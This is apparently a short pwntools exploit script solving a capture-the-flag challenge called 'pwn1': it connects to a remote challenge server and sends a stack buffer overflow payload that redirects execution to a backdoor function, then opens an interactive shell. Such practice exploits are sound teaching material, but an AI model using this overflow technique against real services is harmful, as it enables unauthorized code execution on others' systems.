# method one

from pwn import *

# p = process("./pwn1")
p = remote("node4.buuoj.cn", 26231)

# ```+1``` is to avoid ```movaps```
back_door = 0x000000000401186+1

payload = cyclic(0xf+0x8)+p64(back_door)
p.sendline(payload)

p.interactive()

